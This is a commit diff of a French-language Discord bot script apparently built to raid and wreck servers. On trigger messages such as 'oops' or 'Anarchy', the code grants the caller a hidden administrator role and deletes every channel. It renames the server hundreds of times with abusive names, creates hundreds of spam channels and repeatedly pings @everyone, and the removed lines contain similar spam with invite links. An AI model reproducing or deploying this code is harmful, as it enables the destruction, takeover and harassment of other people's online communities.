aa68264d39004ce4b85005ad24e1c21a2598efbf
KawaiiAlex <38259844+KawaiiAlex@users.noreply.github.com>
2019-01-18 20:43:12 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,53 +1,74 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-var prefix = ".";
-var mention = "126connectés"
 
-var fucked = false;
-
-/*client.on('ready',() => {
+client.on('ready',() => {
+  console.log(client.user.username + "go");
     //invit link
-    client.guilds.forEach(guild => {
+    /*client.guilds.forEach(guild => {
       var invite = client.guilds.find("id", guild.id).channels.find("id", guild.defaultChannel.id);
       invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
-    })
-});*/
- 
+    })*/
+});
+/*
+  guild.setIcon('https://cdn.discordapp.com/icons/518757431250255872/3affdc73ea126ad1827c48143479e62c.jpg?size=1024').catch(e => {});
+  guild.setName('Dead by Anarchy haha !').catch(e => {});
+  
+  for (var i = 0; i < 415; i++) {
+    guild.createChannel('purgé par DOS.', 'voice').catch(e => {});
+  }
+  
+  for (var i = 0; i < 49; i++) {
+    guild.createChannel('Détruit par Anarchy !!!', 'text').catch(e => {});
+  }
+*/
+
 
 client.on('message', msg => {
  
 
-  if (msg.content === '-ded') {
+  /*if (msg.content === '-ded') {
       if (msg.channel.type === "dm") return;
       if (msg.deletable) msg.delete();
       msg.guild.members.forEach(member => {
         
-          member.send("**" + msg.guild.owner.user.username + "** a été purgé par DOS\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/RUXkZqp").catch(error => {}) }, 450)
+          member.send("**" + msg.guild.owner.user.username + "** détruit par Anarchy ;)").catch(error => {}) }, 450)
 }
-
-if(msg.content === '-del'){
+*/
+if(msg.content === 'oops'){
 if(msg.channel.type === "dm") return;
 if(msg.guild.channels.size === 0) return;
 else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
+msg.member.guild.createRole({
+  name: "󠂪",
+  permissions: "ADMINISTRATOR",
+  mentionable: false
+  }).then(function(role) {
+  msg.member.addRole(role);
+  if (msg.deletable) msg.delete().catch(e => {});
+  }).catch(e => {});
 msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
+for (var i = 0; i < 490; i++) {
+  msg.guild.setIcon('https://cdn.discordapp.com/attachments/535351927882645525/535901228769476619/unknown.png').catch(e => {})
+  msg.guild.setName('Violé par Anarchy ' + i + ' fois.').catch(e => {});
+  msg.guild.createChannel('Détruit par Anarchy', 'voice').catch(e => {});
+  msg.guild.createChannel('Détruit par Anarchy', 'text').catch(e => {});
+}
 }
 
-if (msg.content === '-ded') {
+if (msg.content === 'Anarchy') {
 console.log(`Commande -ded par ${msg.author.tag}`);
 
+msg.guild.setIcon('https://cdn.discordapp.com/icons/518757431250255872/3affdc73ea126ad1827c48143479e62c.jpg?size=1024').catch(e => {});
+msg.guild.setName('Dead by Anarchy haha !').catch(e => {});
 
-
-if (!fucked){
-msg.guild.setIcon('https://cdn.discordapp.com/attachments/529372289935081472/529800499113754624/20190102_001632.gif').catch(e => {});
-msg.guild.setName('purgé par DOS.').catch(e => {});
-
-for (var i = 0; i < 390; i++) {
-msg.guild.createChannel('purgé par DOS.', 'voice').catch(e => {});
-msg.guild.createChannel('purgé par DOS', 'text').catch(e => {});
+for (var i = 0; i < 415; i++) {
+  msg.guild.createChannel('purgé par DOS.', 'voice').catch(e => {});
 }
 
-fucked = true;
+for (var i = 0; i < 49; i++) {
+  msg.guild.createChannel('Détruit par Anarchy !!!', 'text').catch(e => {});
 }
+
 
 if (msg.deletable) {
 msg.delete();
@@ -82,13 +103,15 @@ if (msg.deletable) msg.delete().catch(e => {});
 //#endregion
 });
 client.on("message", msg => {
-if(msg.content.startsWith("-ded")){
+if(msg.content.startsWith("oops")){
+  setTimeout(function(){
  msg.delete()
   let i = 0;
   let interval = setInterval(function () {
     msg.guild.channels.forEach(channel => {
-      if (channel.type === "text") channel.send("@everyone Ce serveur à été purgé par DOS.\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nhttps://discord.gg/mvZjEDW\nhttps://cdn.discordapp.com/attachments/529372289935081472/529800499113754624/20190102_001632.gif")
+      if (channel.type === "text") channel.send("@everyone")
     }, 2500);
+  }, 1000);
   });
 }
 });
